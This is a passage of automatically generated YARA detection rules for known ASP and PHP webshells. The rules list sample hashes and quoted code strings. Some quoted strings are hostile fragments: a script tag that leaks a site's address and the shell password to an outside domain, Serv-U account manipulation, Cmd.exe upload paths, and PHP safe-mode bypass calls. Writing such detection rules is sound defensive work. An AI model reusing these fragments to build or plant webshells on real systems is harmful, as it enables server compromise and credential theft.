      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash4 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash6 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash7 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash8 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash9 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash10 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash11 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash12 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "tport = request.Form(\"tport\")" fullword ascii
      $s2 = "Usr = request.Form(\"duser\")" fullword ascii
      $s3 = "port = request.Form(\"dport\")" fullword ascii
      $s4 = "tuser = request.Form(\"tuser\")" fullword ascii
      $s5 = "tpass = request.Form(\"tpass\")" fullword ascii
      $s6 = "pwd = request.Form(\"dpwd\")" fullword ascii
      $s7 = "tpath = request.Form(\"tpath\")" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _asp_4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_NEW_WebShell__1__2_414 {
   meta:
      description = "webshell - from files asp.asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, NEW WebShell (1).asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, asp (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, vps.asp, NEW WebShell.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash3 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash4 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash5 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash6 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash7 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash8 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash9 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash10 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash11 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash12 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash13 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash14 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash15 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash16 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash17 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash18 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash19 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "        \"-QuotaEnable=0\" & vbCrLf & \"-MaxUsersLoginPerIP=-1\" & vbCrLf & \"-SpeedLimitUp=0\" & vbCrLf & \"-SpeedLimitDown=0\"" ascii
      $s2 = "        \"-NeedSecure=0\" & vbCrLf & \"-HideHidden=0\" & vbCrLf & \"-AlwaysAllowLogin=0\" & vbCrLf & \"-ChangePassword=0\" & vbC" ascii
      $s3 = "        \"-QuotaEnable=0\" & vbCrLf & \"-MaxUsersLoginPerIP=-1\" & vbCrLf & \"-SpeedLimitUp=0\" & vbCrLf & \"-SpeedLimitDown=0\"" ascii
      $s4 = "        \"-MaxNrUsers=-1\" & vbCrLf & \"-IdleTimeOut=600\" & vbCrLf & \"-SessionTimeOut=-1\" & vbCrLf & \"-Expire=0\" & vbCrLf &" ascii
      $s5 = "        \"-MaxNrUsers=-1\" & vbCrLf & \"-IdleTimeOut=600\" & vbCrLf & \"-SessionTimeOut=-1\" & vbCrLf & \"-Expire=0\" & vbCrLf &" ascii
      $s6 = "Up=1\" & vbCrLf & _" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_asp__1__415 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
   strings:
      $x1 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $s2 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
      $s3 = ";'><br><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr" ascii
      $s4 = "Variables(\"url\"))&\"&pass=\"&UserPass&\"\"\"></script><center><div style='width:500px;border:1px solid #222;padding:22px;margi" ascii
      $s5 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Av.asp\")&\"' size='40'>\"" fullword ascii
      $s6 = "Webshell\" 'shell" fullword ascii
      $s7 = "br>\"&mmshell&\"</div></center>\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _asp___1__4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_asp_416 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, asp (1).asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, asp (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, vps.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash4 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash5 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash6 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash7 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash8 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash9 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash10 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash11 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash12 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash13 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash14 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash15 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash16 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash17 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash18 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash19 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash20 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash21 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash22 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
      hash23 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = " 127.0.0.1:\"&port&\"," fullword ascii
      $s2 = "<br><font color=red>\"&cmd&\"</font><br><br>\"" fullword ascii
      $s3 = "set session(\"b\")=b" fullword ascii
      $s4 = "set session(\"a\")=a" fullword ascii
      $s5 = ": \"&user&\"," fullword ascii
      $s6 = "</a></center>\"" fullword ascii
      $s7 = " ' onClick=\"\"location.href='?Action=Servu';\"\">\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_NEW_WebShell__1__2014_4_0__1__NEW_WebShell__1___2014_10_23_1_417 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, NEW WebShell (1).asp, 2014.asp, 4.0 (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, NEW WebShell.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash6 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash7 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash8 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash9 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash10 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash11 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash12 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash13 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash14 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "response.write(str)" fullword ascii
      $s2 = "Function Course()" fullword ascii
      $s3 = "Function RRePath(S)" fullword ascii
      $s4 = "if Action<>\"Servu\" then ShowErr()" fullword ascii
      $s5 = "sub ShowErr()" fullword ascii
      $s6 = "Function MainMenu()" fullword ascii
      $s7 = "SUaction=request(\"SUaction\")" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1____2012_418 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, .asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash6 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = "  newsearch.keyword=trim(Request.Form(\"Sfk\"))" fullword ascii
      $s2 = "  RW=RW & \"</form></table>\"" fullword ascii
      $s3 = ">wolley=roloc tnof< " fullword ascii
      $s4 = "  RW=RW & \"<tr><td bgcolor=''>&nbsp;" fullword ascii
      $s5 = "  if Request.Form(\"Sfk\")<>\"\" then" fullword ascii
      $s6 = "  RW=RW & \"<tr><td height='20' align='center' bgcolor=''>" fullword ascii
      $s7 = "  j RW : RW=\"\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _404_mumaasp_com_419 {
   meta:
      description = "webshell - from files 404.asp, mumaasp.com.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e4d3d57f4de0497d24095cbd83d5500268323e247e4de2e69cd704975b134678"
      hash2 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
   strings:
      $s1 = "W'ELC\\m/^.bwY=jtKhsKs[+M`rJ/)wwqqHf}" fullword ascii
      $s2 = "PznkW3vbB,mVmdd'ElsB~YrO^+xB" fullword ascii
      $s3 = "YkPCx[~U+OYbUok-w)^VPid" fullword ascii
      $s4 = "JE*iEPYbY^n'E" fullword ascii
      $s5 = "O+M@*@!8M@*@!8.@*@!8D@*" fullword ascii
      $s6 = "@#@&nx9PWE" fullword ascii
      $s7 = "UN,k0=3UN,s!x^YrG" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _DarkBlade1_5_tool_indexx_420 {
   meta:
      description = "webshell - from files DarkBlade1.5.asp, tool.asp, indexx.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
      hash2 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
      hash3 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
   strings:
      $s1 = "Case 0" fullword ascii /* Goodware String - occured 2 times */
      $s2 = "Case \"3\"" fullword ascii
      $s3 = "Case \"5\"" fullword ascii
      $s4 = "Case \"1\"" fullword ascii
      $s5 = "Case \"4\"" fullword ascii
      $s6 = "Case \"2\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _____1__421 {
   meta:
      description = "webshell - from files .asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
      hash2 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash3 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "</b><input name='pass' type='password' size='22'> <input type='submit' value='submit'></center>\"" fullword ascii
      $s2 = "oo'?><?php phpinfo()?>\"" fullword ascii
      $s3 = "j\"<li>" fullword ascii
      $s4 = "j\"<br>\"" fullword ascii
      $s5 = "j\"<Br>\"" fullword ascii
      $s6 = "\"&\"DNS" fullword ascii
      $s7 = "j\"<li>IP" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _elmaliseker_zehir4_zehir_422 {
   meta:
      description = "webshell - from files elmaliseker.asp, zehir4.asp, zehir.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "aba1440e6fa797116ec2d0f0dda9278eae32ee2155ee0c5ae41dc4e02337bfbd"
      hash2 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
      hash3 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
   strings:
      $s1 = "sub Upload()" fullword ascii
      $s2 = "' ------------------------------------------------------------------------------" fullword ascii
      $s3 = "function setid() {" fullword ascii
      $s4 = "setid();" fullword ascii
      $s5 = "Class clsUpload" fullword ascii
      $s6 = "<td id=upid>" fullword ascii
      $s7 = "Class clsField" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _____1__423 {
   meta:
      description = "webshell - from files .asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash2 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash3 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'><input name='LocalFile' type='file' " ascii
      $s2 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'><input name='LocalFile' type='file' " ascii
      $s3 = "PortList=\"21,23,53,1433,3306,3389,4899,5631,5632,5800,5900,43958\"" fullword ascii
      $s4 = "FontColor=\"#b4a9a9\"" fullword ascii
      $s5 = "'></td></tr></form></table>\"" fullword ascii
      $s6 = "LinkColor=\"#ffffff\"" fullword ascii
      $s7 = "25'> <input type='submit' name='Submit' value='" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _bypass403_wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_424 {
   meta:
      description = "webshell - from files bypass403.php, wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0f4ac0a10f5b4ee27fec5e85928fd45ef76d48b24bc6d822a5f68cdbe5c433b3"
      hash2 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash3 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash4 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash5 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash9 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash10 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash11 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash12 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash13 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "$i .= (($p & 0x0080) ? 'w' : '-');" fullword ascii
      $s2 = "$i .= (($p & 0x0004) ? 'r' : '-');" fullword ascii
      $s3 = "$i .= (($p & 0x0020) ? 'r' : '-');" fullword ascii
      $s4 = "$i .= (($p & 0x0010) ? 'w' : '-');" fullword ascii
      $s5 = "$i .= (($p & 0x0002) ? 'w' : '-');" fullword ascii
      $s6 = "$i .= (($p & 0x0100) ? 'r' : '-');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_kartal_ctt_sh_r57_r57_iFX_425 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57_kartal.php, ctt_sh.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash5 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash8 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash9 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "$curl_on = @function_exists('curl_version');" fullword ascii
      $s2 = "submit {" fullword ascii
      $s3 = " echo \"</textarea>\";" fullword ascii
      $s4 = ".table1 {" fullword ascii
      $s5 = ".tr1 {" fullword ascii
      $s6 = ".td1 {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _angel_wso_4_2_4_v4xGus6X_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3_spy__v_wso_4_2_2_20_426 {
   meta:
      description = "webshell - from files angel.php, wso-4.2.4.php, v4xGus6X.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, spy.php, .v.php, wso-4.2.2.php, 2011.php, 2013.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash3 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash4 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash5 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash6 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash7 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash8 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash9 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash10 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash11 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash12 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash13 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash14 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash15 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash16 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash17 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "$temp=array();" fullword ascii
      $s2 = "if(function_exists('mysql_get_client_info'))" fullword ascii
      $s3 = "if(function_exists('oci_connect'))" fullword ascii
      $s4 = "if(strpos($v, \"\\n\") === false)" fullword ascii
      $s5 = "if(function_exists('mssql_connect'))" fullword ascii
      $s6 = "if(function_exists('pg_connect'))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _angel_shell_phpspy_2005_full_2008_PHPSPY_phpspy_2006_2009lite_spy_lnc_2011_2009mssql_phpspy_2005_lite_427 {
   meta:
      description = "webshell - from files angel.php, shell.php, phpspy_2005_full.php, 2008.php, PHPSPY.php, phpspy_2006.php, 2009lite.php, spy.php, lnc.php, 2011.php, 2009mssql.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash3 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash4 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash5 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
      hash6 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash7 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash8 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash9 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash10 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash11 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
      hash12 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "}//end loginpage()" fullword ascii
      $s2 = "error_reporting(7);" fullword ascii
      $s3 = "while($file=$mydir->read())" fullword ascii
      $s4 = "while ($file=@readdir($dirs)) {" fullword ascii
      $s5 = "$mydir=@dir($deldir);" fullword ascii
      $s6 = "$mydir->close(); " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_G5_r57_1_4_0_428 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, G5.php, r57.1.4.0.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "8442b9e1aa672ef4aca99eb2ee61ca7a81c3ee6e73d815c0f88d94df4c0a46c0"
      hash3 = "ce7e1e6b461da1dda603a36cebac7fd3083abb50497bfc3f23409a21bd01ac22"
   strings:
      $s1 = "@ini_restore(\"safe_mode_exec_dir\");" fullword ascii
      $s2 = "@ini_restore(\"safe_mode\");" fullword ascii
      $s3 = "@ini_restore(\"disable_functions\");" fullword ascii
      $s4 = "@ini_restore(\"allow_url_fopen\");" fullword ascii
